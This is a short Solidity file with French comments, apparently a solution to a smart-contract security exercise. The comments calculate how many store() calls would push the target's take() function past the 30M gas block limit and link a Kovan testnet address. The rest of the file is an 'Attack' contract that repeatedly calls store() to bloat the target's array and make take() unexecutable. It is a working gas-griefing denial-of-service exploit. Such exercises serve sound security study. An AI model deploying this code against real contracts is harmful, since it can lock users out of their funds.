/** Cost exec de take() en fonction du nombre de safes (ajouter par une autre adresse) :
* f(0)  = 23326
* f(1)  = 26011
* f(2)  = 28696
* f(3)  = 31381
* f(4)  = 34066
* f(5)  = 36751
*
* Soit 2685 gas par ajout d'elements dans le tableau
* Pour arriver à 30M gas, il faut donc 11165 appels à store().
*
* Exemple @ https://kovan.etherscan.io/address/0xffa4602f4c43039ef88c3ad351c61dac05bdd54e
*/


contract Attack{

    Store public store;

    constructor(Store _store) {
        store = Store(_store);
    }

    function attack() public {
        for(uint i=0;i< 150;i++){
            store.store();
        }
    }
    function attackbis() external {
        do{
            store.store();
        }while(gasleft() > 100000);
    }
}